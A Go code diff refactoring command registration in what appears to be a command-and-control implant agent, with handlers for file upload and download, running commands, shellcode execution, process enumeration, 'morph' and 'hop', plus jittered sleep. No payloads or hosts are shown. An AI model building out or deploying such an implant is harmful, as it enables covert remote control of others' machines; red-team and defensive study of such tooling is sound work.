@@ -25,18 +25,6 @@ type Agent struct {
 	commandOrchestrators map[string]OrchestratorFunc // Maps commands to their keywords
 }
 
-func registerCommands(agent *Agent) *Agent {
-	agent.commandHandlers["upload"] = (*Agent).orchestrateUpload
-	agent.commandHandlers["download"] = (*Agent).orchestrateDownload
-	agent.commandHandlers["run_cmd"] = (*Agent).orchestrateRunCmd
-	agent.commandHandlers["shellcode"] = (*Agent).orchestrateShellcode
-	agent.commandHandlers["enum_proc"] = (*Agent).orchestrateEnumProc
-	agent.commandHandlers["morph"] = (*Agent).orchestrateMorph
-	agent.commandHandlers["hop"] = (*Agent).orchestrateHop
-
-	return agent
-}
-
 // NewAgent creates and initializes a new Agent instance.
 func NewAgent(cfg config.AgentConfig) (*Agent, error) {
 	log.Println("|AGENT INIT|-> Creating new agent instance...")
@@ -50,16 +38,28 @@ func NewAgent(cfg config.AgentConfig) (*Agent, error) {
 	log.Printf("|AGENT INIT|-> Agent configured for protocol: %s", cfg.Protocol)
 
 	agent := &Agent{
-		config:       cfg,
-		communicator: communicator,
-		stopChan:     make(chan struct{}),
-		rng:          rand.New(rand.NewSource(time.Now().UnixNano())),
+		config:               cfg,
+		communicator:         communicator,
+		stopChan:             make(chan struct{}),
+		rng:                  rand.New(rand.NewSource(time.Now().UnixNano())),
+		commandOrchestrators: make(map[string]OrchestratorFunc), // WE NEED TO INSTANTIATE
 	}
 
-	agent = registerCommands(agent) // REGISTER ALL OUR COMMANDS
+	registerCommands(agent) // REGISTER ALL OUR COMMANDS
 
 	log.Println("|AGENT INIT|-> Agent instance created successfully.")
 	return agent, nil
+}
+
+func registerCommands(agent *Agent) {
+	agent.commandOrchestrators["upload"] = (*Agent).orchestrateUpload
+	agent.commandOrchestrators["download"] = (*Agent).orchestrateDownload
+	agent.commandOrchestrators["run_cmd"] = (*Agent).orchestrateRunCmd
+	agent.commandOrchestrators["shellcode"] = (*Agent).orchestrateShellcode
+	agent.commandOrchestrators["enum_proc"] = (*Agent).orchestrateEnumProc
+	agent.commandOrchestrators["morph"] = (*Agent).orchestrateMorph
+	agent.commandOrchestrators["hop"] = (*Agent).orchestrateHop
+
 }
 
 // calculateSleepWithJitter calculates the next sleep duration based on BaseSleep and Jitter.
